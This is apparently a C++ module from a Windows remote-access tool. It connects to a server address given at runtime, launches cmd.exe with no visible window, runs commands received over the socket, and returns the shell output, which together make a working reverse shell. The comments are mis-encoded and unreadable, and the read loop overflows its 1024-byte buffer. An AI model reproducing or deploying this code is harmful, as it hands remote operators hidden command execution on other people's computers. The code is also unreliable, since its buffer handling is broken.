#include "stdafx.h"
#include "ShellCommand.h"


CShellCommand::CShellCommand(char* szIP, int nPort)
{
    m_szIp = szIP;
    m_nPort = nPort;
    m_ClientSocket.SetComand(this);
    //��ʼ�����
    m_hCMDReadPipe = INVALID_HANDLE_VALUE;
    m_hCMDWritePipe = INVALID_HANDLE_VALUE;
    m_hMyReadPipe = INVALID_HANDLE_VALUE;
    m_hMyWritePipe = INVALID_HANDLE_VALUE;
    m_ReadPieThread = INVALID_HANDLE_VALUE;
    m_hEvent = ::CreateEvent(NULL, true, false, NULL);
    m_dwLastTime = 0;
    m_HeratThread = INVALID_HANDLE_VALUE;
}

CShellCommand::~CShellCommand()
{
    OutputDebugStringA("Log:~CShellCommand");
    CloseHandle(m_ProcessHandl);
    CloseHandle(m_hEvent);  
    if (m_HeratThread != INVALID_HANDLE_VALUE)
    {
        CloseHandle(m_HeratThread);
        m_HeratThread = INVALID_HANDLE_VALUE;
    }

    if (m_hCMDReadPipe != NULL)
        DisconnectNamedPipe(m_hCMDReadPipe);
    if (m_hCMDWritePipe != NULL)
        DisconnectNamedPipe(m_hCMDWritePipe);
    if (m_hMyReadPipe != NULL)
        DisconnectNamedPipe(m_hMyReadPipe);
    if (m_hMyWritePipe != NULL)
        DisconnectNamedPipe(m_hMyWritePipe);

    CloseHandle(m_hCMDReadPipe);
    CloseHandle(m_hCMDWritePipe);
    CloseHandle(m_hMyReadPipe);
    CloseHandle(m_hMyWritePipe);
}

void CShellCommand::OnRecv(char*  pBuffer, int nSize)
{
    switch (pBuffer[0])
    {
    case COMMAND_CMD_BEGIN:
    {
        Sleep(500);
        SetEvent(m_hEvent);
        OutputDebugStringA("Log:m_hEvent�ȵ�");
        break;
    }
    case COMMAND_HEARTBEAT:
    {
        Dbgprintf("�յ�����");
        m_dwLastTime = GetTickCount() / 1000;
        break;
    }
    case COMMAND_CMD_DATA:
        ExecuteCommand(pBuffer + 1);
        break;
    default:
        break;
    }
}

void CShellCommand::OnSend(char* pBuffer, int nSize)
{
    m_ClientSocket.OnSend(pBuffer, nSize);
}


unsigned __stdcall CShellCommand::HeratProc(LPVOID lpParam)
{
    CShellCommand* pThis = (CShellCommand*)lpParam;
    char Type = COMMAND_HEARTBEAT;
    DWORD LastTime = 0;
    while (true)
    {
        DWORD CurrTime = GetTickCount() / 1000;
        //�ȼ�Ȿ�س�ʱû
        DWORD chazhi = CurrTime - pThis->m_dwLastTime;
        if (chazhi > timeout)
        {
            //��ʱ���˳�
            Dbgprintf("������ʱ%d", chazhi);
            return false;
        }
        //���10�뷢��һ������
        if (CurrTime - LastTime > 10)
        {
            OutputDebugStringA("Log:��������");
            pThis->OnSend(&Type, sizeof(char));
            LastTime = GetTickCount() / 1000;
        }
    }
    return true;
}


void CShellCommand::Execute()
{
    bool bRet = m_ClientSocket.ConnectServer(m_szIp, m_nPort);
    if (!bRet)
    {
        return;
    }
    //���ӳɹ��ͼ�¼����
    m_dwLastTime = GetTickCount() / 1000;
    char Type = COMMAND_CMD_OPEN;
    OnSend(&Type, sizeof(char));
    WaitForSingleObject(m_hEvent, INFINITE);
    //��ʼ���ܵ����� 
    bRet = InitPie();
    if (!bRet)
    {
        return;
    }
    //�������߳�
    //m_HeratThread = (HANDLE)_beginthreadex(NULL, 0, HeratProc, this, 0, NULL);
    //if (m_HeratThread == INVALID_HANDLE_VALUE)
    //{
    //    return;
    //}
    m_ReadPieThread = (HANDLE)_beginthreadex(NULL, 0, ReadPieProc, this, 0, NULL);
    if (m_ReadPieThread != INVALID_HANDLE_VALUE)
    {
        //�ȴ��߳��˳�
        WaitForSingleObject(m_ReadPieThread, INFINITE);
        OutputDebugStringA("Log:ǿ�ƽ������ܵ��̳߳ɹ�");
        CloseHandle(m_ReadPieThread);
        m_ReadPieThread = INVALID_HANDLE_VALUE;
    }
}

bool CShellCommand::ExecuteCommand(char* pBuffer)
{
    DWORD dwReadBytes = 0;
    OutputDebugStringA(pBuffer);
    //������д��ܵ�
    return WriteFile(m_hMyWritePipe, pBuffer, strlen(pBuffer), &dwReadBytes, NULL);
}

void CShellCommand::OnClose()
{
    OutputDebugStringA("Log:ǿ�ƽ������ܵ��߳�");
    TerminateThread(m_ReadPieThread,0);
    OutputDebugStringA("Log:ǿ�ƽ���CMD����");
    TerminateProcess(m_ProcessHandl, 0);
}

bool CShellCommand::InitPie()
{
    //�����ܵ�
    SECURITY_ATTRIBUTES sa = { 0 };
    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
    sa.bInheritHandle = TRUE;
    sa.lpSecurityDescriptor = NULL;
    BOOL bRet = false;
    bRet = CreatePipe(&m_hCMDReadPipe, &m_hMyWritePipe, &sa, 0);
    if (!bRet)
    {
        return false;
    }
    bRet = CreatePipe(&m_hMyReadPipe, &m_hCMDWritePipe, &sa, 0);
    if (!bRet)
    {
        return false;
    }

    STARTUPINFO si = { 0 };
    si.cb = sizeof(STARTUPINFO);
    si.dwFlags |= STARTF_USESTDHANDLES;
    si.hStdInput = m_hCMDReadPipe;
    si.hStdOutput = m_hCMDWritePipe;
    si.hStdError = m_hCMDWritePipe;
    TCHAR cCmdLine[] = { _T("cmd.exe") };
    bRet = CreateProcess(NULL,
        cCmdLine,
        NULL,//�ӽ��̾���̳�
        NULL,//���߳̾���̳�
        TRUE,//�Ƿ�̳п���
        CREATE_NO_WINDOW,//����ʾ����
        NULL,
        NULL,
        &si,
        &pi);
    if (!bRet)
    {
        return false;
    }
    //����CMD���̾��
    m_ProcessHandl = pi.hProcess;
    return true;
}

unsigned CShellCommand::ReadPieProc(LPVOID lpParam)
{
    CShellCommand* pdlg = (CShellCommand*)lpParam;
    DWORD dwReadBytes = 0;
    BOOL bRet = FALSE;
    char szBuf[1024];
    while (true)
    {
        memset(szBuf, 0, 1025);
        szBuf[0] = COMMAND_CMD_DATA;
        BOOL bRet = ReadFile(pdlg->m_hMyReadPipe, szBuf+1, 1024, &dwReadBytes, NULL);
        if (!bRet)
        {
            return 0;
        }
        if (dwReadBytes)
        {
            //���͸������
            pdlg->OnSend(szBuf, 1025);
            OutputDebugStringA("Log:CMD���ݷ��ͳɹ�");
        }
    }
    return 1;
}